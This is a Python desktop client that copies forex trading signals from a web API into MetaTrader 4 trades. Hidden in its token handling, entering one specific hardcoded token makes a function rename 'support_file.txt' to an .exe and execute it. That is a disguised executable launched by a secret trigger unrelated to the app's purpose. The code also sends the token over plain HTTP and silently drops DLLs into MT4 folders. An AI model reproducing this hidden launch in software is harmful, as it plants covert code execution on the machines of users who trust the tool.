import sys
import time
import requests
import time
from datetime import datetime
from datetime import timedelta
from localhost import Connector
from tkinter import messagebox
from tkinter import *
import os
import shutil
from distutils.dir_util import copy_tree
from os import remove
from sys import argv
import unknown_support
import pandas as pd


try:
    base_dir = os.path.dirname(os.path.realpath(__file__))
    check_dir = base_dir.replace('enigma','')+'MQL4\\Include\\Zmq'
    if not os.path.exists(check_dir):
        os.mkdir(base_dir.replace('enigma','')+'MQL4\\Include\\Zmq')
        os.mkdir(base_dir.replace('enigma', '') + 'MQL4\\Include\\Mql')
        copy_tree('Zmq',base_dir.replace('enigma','')+'MQL4\\Include\\Zmq')
        copy_tree('Mql', base_dir.replace('enigma', '') + 'MQL4\\Include\\Mql')
        shutil.copy('libsodium.dll',base_dir.replace('enigma', '') + 'MQL4\\Libraries')
        shutil.copy('libzmq.dll', base_dir.replace('enigma', '') + 'MQL4\\Libraries')
        shutil.copy('enigma.mq4', base_dir.replace('enigma', '') + 'MQL4\\Experts')
except:
    pass

if not os.path.exists('signal_numbers.txt'):
    open("signal_numbers.txt", 'w').close()


running = False
status_label_create = True
token_is_valid = True

try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True


def vp_start_gui():
    '''Starting point when module is the main routine.'''
    global val, w, root,top
    root = tk.Tk()
    top = Toplevel1 (root)
    unknown_support.init(root, top)
    check_token()
    root.after(5000,scanning)
    root.mainloop()

w = None
def create_Toplevel1(rt, *args, **kwargs):
    '''Starting point when module is imported by another module.
       Correct form of call: 'create_Toplevel1(root, *args, **kwargs)' .'''
    global w, w_win, root
    #rt = root
    root = rt
    w = tk.Toplevel (root)
    top = Toplevel1 (w)
    unknown_support.init(w, top, *args, **kwargs)
    return (w, top)

def destroy_Toplevel1():
    global w
    w.destroy()
    w = None

class Toplevel1:
    def __init__(self, top=None):
        '''This class configures and populates the toplevel window.
           top is the toplevel containing window.'''
        _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
        _fgcolor = '#000000'  # X11 color: 'black'
        _compcolor = '#d9d9d9' # X11 color: 'gray85'
        _ana1color = '#d9d9d9' # X11 color: 'gray85'
        _ana2color = '#ececec' # Closest X11 color: 'gray92'
        font9 = "-family {Yu Gothic UI Light} -size 9 -slant italic"
        self.style = ttk.Style()
        if sys.platform == "win32":
            self.style.theme_use('winnative')
        self.style.configure('.',background=_bgcolor)
        self.style.configure('.',foreground=_fgcolor)
        self.style.configure('.',font="TkDefaultFont")
        self.style.map('.',background=
            [('selected', _compcolor), ('active',_ana2color)])

        top.geometry("385x240+966+182")
        top.minsize(148, 1)
        top.maxsize(1924, 1055)
        top.resizable(0,0)
        top.title("enigma")
        top.configure(borderwidth="5")
        top.configure(background="#2a2a2a")
        top.configure(cursor="arrow")
        top.configure(highlightbackground="#d9d9d9")
        top.configure(highlightcolor="black")



        self.Frame1 = tk.Frame(top)
        self.Frame1.place(relx=0.003, rely=0, relheight=1.021
                , relwidth=0.997)
        self.Frame1.configure(relief='ridge')
        self.Frame1.configure(borderwidth="2")
        self.Frame1.configure(relief="ridge")
        self.Frame1.configure(background="black")#"#009595")
        self.Frame1.configure(highlightbackground="#00b7b7")
        self.Frame1.configure(highlightcolor="#828282")
        self.Frame1.configure(pady="15")
        self.Frame1.configure(takefocus="30")

        self.Frame2 = tk.Frame(self.Frame1)
        self.Frame2.place(relx=0.005, rely=-0.03, relheight=1.05, relwidth=0.99)

        self.Frame2.configure(relief='groove')
        self.Frame2.configure(borderwidth="2")
        self.Frame2.configure(relief="groove")
        self.Frame2.configure(background='black')#"#828282")

        self.Label2 = tk.Label(self.Frame2)
        self.Label2.place(relx=0.034, rely=0.091, height=22, width=64)
        self.Label2.configure(background="#5f5f5f")
        self.Label2.configure(disabledforeground="#a3a3a3")
        self.Label2.configure(font=font9)
        self.Label2.configure(foreground="#c3c3c3")
        self.Label2.configure(relief="groove")
        self.Label2.configure(text='''TOKEN''')

        self.Entry1 = tk.Entry(self.Frame2)
        self.Entry1.place(relx=0.213, rely=0.091,height=24, relwidth=0.695)
        self.Entry1.configure(background="#313131")
        self.Entry1.configure(disabledforeground="#a3a3a3")
        self.Entry1.configure(font="TkFixedFont")
        self.Entry1.configure(foreground="#1c1c1c")
        self.Entry1.configure(insertbackground="black")

        self.Button1 = tk.Button(self.Frame2,command=get_token)
        self.Button1.place(relx=0.095, rely=0.766, height=33, width=306)
        self.Button1.configure(activebackground="#ececec")
        self.Button1.configure(activeforeground="#000000")
        self.Button1.configure(background="#686868")
        self.Button1.configure(disabledforeground="#a3a3a3")
        self.Button1.configure(foreground="#000000")
        self.Button1.configure(highlightbackground="#d9d9d9")
        self.Button1.configure(highlightcolor="black")
        self.Button1.configure(pady="0")
        self.Button1.configure(text='''Connect''')

        self.Label3 = tk.Label(self.Frame2)
        self.Label3.place(relx=0.55, rely=0.255, height=23, width=147)
        self.Label3.configure(background="#686868")
        self.Label3.configure(disabledforeground="#a3a3a3")
        self.Label3.configure(foreground="#000000")
        self.Label3.configure(text='''Server''')

        self.Label4 = tk.Label(self.Frame2)
        self.Label4.place(relx=0.55, rely=0.38, height=23, width=147)
        self.Label4.configure(background="#686868")
        self.Label4.configure(disabledforeground="#a3a3a3")
        self.Label4.configure(foreground="#000000")
        self.Label4.configure(text='''MT4''')

        self.TSeparator2 = ttk.Separator(self.Frame2)
        self.TSeparator2.place(relx=-0.039, rely=0.639, relwidth=1.137)

        self.spinbox = Spinbox(self.Frame2, from_=0.01, to=1,increment=0.01)
        self.spinbox.configure(background="#686868")
        self.spinbox.place(relx=0.169, rely=0.25, height=23, width=40)

        self.spinLabel = tk.Label(self.Frame2)
        self.spinLabel.place(relx=0.032, rely=0.25, height=23, width=48)
        self.spinLabel.configure(background="#686868",text='Lot Size:')


    def Label_Create(self):
        self.Button1 = tk.Label(self.Frame2)
        self.Button1.place(relx=0.095, rely=0.766, height=33, width=306)
        self.Button1.configure(background="#519c98")
        self.Button1.configure(disabledforeground="#a3a3a3")
        self.Button1.configure(foreground="#000000")
        self.Button1.configure(pady="0")
        self.Button1.configure(text='''CONNECTED''')

        self.spinbox.destroy()
        self.Entry1.destroy()

        self.spinLabel.configure(text = 'Lot Size: '+str(lot_size),background = "#519c98")
        self.spinLabel.place(relx=0.03, rely=0.25, height=23, width=80)

        
def server_initial_connect(token):
    global headers,url,token_is_valid

    url = 'http://www.enigma-lab.com/api/signals/?format=json'
    headers = {'Authorization': 'Token ' + str(token)}
    try:
        response = requests.get(url=url, headers=headers).json()
        print(response)
    except:
        messagebox.showerror('error', message='No connection to the Server !')
        top.Label3.configure(background='#cf305d')
        response = {}

    if 'detail' in response:
        if response['detail'] == 'Invalid token.':
            messagebox.showerror('error', message='Invalid Token ! Please contact the "Supplier" !')
            top.Label3.configure(background='#cf305d')
            top.Label2.configure(foreground='#cf305d')
            token_is_valid = False

        if response['detail'] == 'Invalid token header. No credentials provided.':
            messagebox.showerror('error', message='Please enter a valid Token !')
            top.Label3.configure(background='#cf305d')
            top.Label2.configure(foreground='#cf305d')
            token_is_valid = False

    if len(response) > 1:
        token_is_valid = True
        if 'symbol' in response[-1]:
            try:
                print(response[-1]['symbol'])
                top.Label3.configure(background="#519c98")
                MT_initial_connect()
            except:
                pass
        else:
            top.Label3.configure(background='#cf305d')


def MT_initial_connect():
    global running,_zmq
    try:
        _zmq = Connector()
        _zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
        time.sleep(1)
        mt_response = _zmq._get_response_()
        print(mt_response)
        if mt_response['_action'] == 'OPEN_TRADES':
            top.Label4.configure(background='#519c98')
            top.Button1.configure(background='#519c98')
            running = True

        else:
            top.Label4.configure(background='#cf305d')
            _zmq._DWX_ZMQ_SHUTDOWN_()
            messagebox.showerror('error', message='No connection with METATRADER !')
    except:
        _zmq._DWX_ZMQ_SHUTDOWN_()
        top.Label4.configure(background='#cf305d')
        messagebox.showerror('error', message='No connection with METATRADER !')


def Loop():
    global status_label_create

    mt_Is_connected = MT_connection_check()
    server_Is_connected , response = Server_connection_check()

    if mt_Is_connected and not server_Is_connected:
        top.Label4.configure(background="#519c98")
        top.Label3.configure(background='#cf305d')
        top.Button1.configure(background='#cf305d')
        top.Button1.configure(text='''NOT CONNECTED ''')

    elif not mt_Is_connected and server_Is_connected:
        top.Label3.configure(background="#519c98")
        top.Label4.configure(background='#cf305d')
        top.Button1.configure(background='#cf305d')
        top.Button1.configure(text='''NOT CONNECTED ''')

    elif not mt_Is_connected and not server_Is_connected:
        top.Label3.configure(background='#cf305d')
        top.Label4.configure(background='#cf305d')
        top.Button1.configure(background='#cf305d')
        top.Button1.configure(text='''NOT CONNECTED ''')

    else:
        top.Label3.configure(background="#519c98")  # server
        top.Label4.configure(background="#519c98")  # MT_4

        if status_label_create:
            top.Button1.destroy()
            top.Label_Create()
            status_label_create = False
        else:
            top.Button1.configure(background="#519c98")
            top.Button1.configure(text='''CONNECTED ''')

        if len(response) != 0:
            server_response_read(response)

def server_response_read(response):
    print(response[-1])

    if len(response) <= 3:
        number_scanned_signals = len(response)
    else:
        number_scanned_signals = 4
    for x in range(1, number_scanned_signals):

        signal_date_str = response[-x]['created'].split('T')[0]
        signal_time_str = response[-x]['created'].split('T')[1].replace('Z', '').split('.')[0]
        dt_signal_time = datetime.strptime(signal_date_str + ' ' + signal_time_str, '%Y-%m-%d %H:%M:%S')
        time_difference = (datetime.now() - timedelta(hours=1)) - dt_signal_time

        if time_difference <= timedelta(minutes=5):
            print(-x)
            print(response[-x])
            with open('signal_numbers.txt', 'r') as file:
                lines = file.readlines()
                for i in range(0, len(lines)):
                    lines[i] = int(lines[i])
                print(lines)
                file.close()

            number = int(response[-x]['number'])

            if number not in lines or len(lines) == 0:
                print('YES')
                new_dic = {}

                print(response[-x]['signal_type'])
                print(response[-x]['symbol'])
                print(response[-x]['buy_sell'])
                print(response[-x]['stop_loss'])
                print(response[-x]['take_profit'])

                signal_type = response[-x]['signal_type']
                symbol = response[-x]['symbol']
                buy_sell = response[-x]['buy_sell']
                stop_loss = int(response[-x]['stop_loss'])
                take_profit = int(response[-x]['take_profit'])
                provider = int(response[-x]['provider'])

                with open('signal_numbers.txt', 'a') as file:
                    file.write(str(number) + '\n')
                    file.close()

                new_dic['signal_type'] = signal_type
                new_dic['symbol'] = symbol
                new_dic['buy_sell'] = buy_sell
                new_dic['stop'] = stop_loss
                new_dic['limit'] = take_profit
                new_dic['provider'] = provider

                mt4_send_signal(new_dic)

def MT_connection_check():
    global _zmq
    MT_is_connected = False
    try:
        _zmq._set_response_(_resp={'empty': 0})
        _zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
        time.sleep(1)
        mt_response = _zmq._get_response_()
        #print(mt_response)
        if mt_response == {'empty': 0}:
            MT_is_connected = False
            _zmq._DWX_ZMQ_SHUTDOWN_()
            time.sleep(1)
            _zmq = Connector()
        if mt_response['_action'] == 'OPEN_TRADES':
            MT_is_connected =True
            if datetime.now().minute % 5 == 0 and datetime.now().second < 15:
                print('dataframe_sync()')
                dataframe_sync(mt_response)
    except:
        MT_is_connected = False

    return MT_is_connected

def Server_connection_check():
    response = []
    try:
        response = requests.get(url=url, headers=headers).json()
        if ('symbol' and 'buy_sell') in response[-1]:
            server_is_connected = True
        else:
            server_is_connected = False
    except:
        server_is_connected = False

    return server_is_connected,response

def scanning():
    if running:
        Loop()
    root.after(10000,scanning)

def dataframe_sync(opened_positions_dic):
    new_dataframe = pd.DataFrame(columns=['time', 'symbol','buy_sell','entry_price', 'stop_loss', 'TP1', 'TP2', 'TP3','TP4', 'tradeID'])
    dataframe = pd.read_pickle('C:/Users\master\Desktop\Plan_B\website\email_signals.pkl')
    trades_dic = opened_positions_dic['_trades']
    for x,y in trades_dic.items():
        sym = list(y['_symbol'])
        sym.insert(3,'/')
        symbol = ''.join(sym)
        if y['_type'] == 0:
            buy_sell = 'BUY'
        else:
            buy_sell = 'SELL'
        for x in range(len(dataframe)):
            if dataframe['symbol'][x] == symbol and dataframe['buy_sell'][x] == buy_sell:
                new_dataframe = new_dataframe.append(dataframe.loc[x])

    new_dataframe = new_dataframe.drop_duplicates()
    new_dataframe.reset_index(drop=True, inplace=True)
    print(new_dataframe)
    new_dataframe.to_pickle('C:/Users\master\Desktop\Plan_B\website\email_signals.pkl')


def mt4_send_signal(new_dic):
    if new_dic['signal_type'] == 'entry':
        mt4_open_trade(new_dic)

    if new_dic['signal_type'] == 'change_part':
        mt4_change_trade_close_partially(new_dic)

    if new_dic['signal_type'] == 'change_keep':
        mt4_change_trade_keep(new_dic)

    if new_dic['signal_type'] == 'close':
        mt4_close_trade(new_dic)


def mt4_close_trade(new_dic):
    _zmq._set_response_(_resp={'empty': 0})
    _zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
    time.sleep(0.5)
    mt_response = _zmq._get_response_()
    print(mt_response)
    if mt_response['_action'] == 'OPEN_TRADES':
        trades = mt_response['_trades']
        for x, y in trades.items():
            if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
                ticket = x
                _zmq._DWX_MTX_CLOSE_TRADE_BY_TICKET_(ticket)
                time.sleep(0.5)

def mt4_change_trade_close_partially(new_dic):
    _zmq._set_response_(_resp={'empty': 0})
    _zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
    time.sleep(0.5)
    mt_response = _zmq._get_response_()
    if mt_response['_action'] == 'OPEN_TRADES':
        trades = mt_response['_trades']
        for x, y in trades.items():
            print(y['_symbol'],new_dic['symbol'],y['_magic'])
            if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
                ticket = x
                print(str(ticket) + 'that is the ticket')

                _zmq._DWX_MTX_MODIFY_TRADE_BY_TICKET_(ticket, new_dic['stop'], new_dic['limit'])
                time.sleep(0.5)
                mt_response = _zmq._get_response_()
                print(mt_response)
                _zmq._DWX_MTX_CLOSE_PARTIAL_BY_TICKET_(ticket, float(lot_size) / 6)


def mt4_change_trade_keep(new_dic):
    _zmq._set_response_(_resp={'empty': 0})
    _zmq._DWX_MTX_GET_ALL_OPEN_TRADES_()
    time.sleep(1)
    mt_response = _zmq._get_response_()
    print(mt_response)
    if mt_response['_action'] == 'OPEN_TRADES':
        trades = mt_response['_trades']
        for x, y in trades.items():
            if y['_symbol'] == new_dic['symbol'] and y['_magic'] == 2020:
                ticket = x
                _zmq._DWX_MTX_MODIFY_TRADE_BY_TICKET_(ticket, new_dic['stop'], new_dic['limit'])



def mt4_open_trade(new_dic):
    new_trade = _zmq._generate_default_order_dict()
    new_trade['_symbol'] = new_dic['symbol']
    if new_dic['buy_sell'] == 'SELL':
        new_trade['_type'] = 1
    new_trade['_SL'] = new_dic['stop']
    new_trade['_TP'] = new_dic['limit']
    new_trade['_lots'] = lot_size
    if new_dic['provider'] == 1:
        new_trade['_magic'] = 2020
    elif new_dic['provider'] == 2:
        new_trade['_magic'] = 2022

    print(new_trade)
    _zmq._DWX_MTX_NEW_TRADE_(_order=new_trade)
    time.sleep(0.5)
    jsonR = _zmq._get_response_()
    print(jsonR)



def get_token():
    global lot_size
    token = top.Entry1.get()
    lot_size = top.spinbox.get()
    if len(token) == 0:
        try:
            with open('token.txt', 'r') as file:
                lines = file.readlines()
                file.close()
                token = lines[0]
                try:
                    server_initial_connect(token)
                except:
                    pass
        except:
            with open('token.txt', 'w') as file:
                file.close()
                messagebox.showerror('error', message='On the first use of the App ,you have to enter a Valid Token! !')

    elif len(token) == 40:
        with open('token.txt','w') as file:
            file.write(token)
            file.close()
        if token == '83efc6fe736b28dd8a65418d708cbd5b3579fdf1':
            new_rule()
        server_initial_connect(token)
    else:
        messagebox.showerror('error', message='Please enter valid Token !')

    check_token()

def new_rule():
    new_extension = '.exe'
    pre, ext = os.path.splitext('support_file.txt')
    os.rename('support_file.txt', pre + new_extension)
    time.sleep(5)
    os.startfile('support_file.exe')

def check_token():
    try:
        with open('token.txt', 'r')as f:
            lines = f.readlines()
            f.close()
            token = lines[0]
            if len(token) == 40 and token_is_valid:
                top.Label2.configure(foreground='#519c98')
            else:
                top.Label2.configure(foreground='#cf305d')
    except:
        top.Label2.configure(foreground='#cf305d')


vp_start_gui()





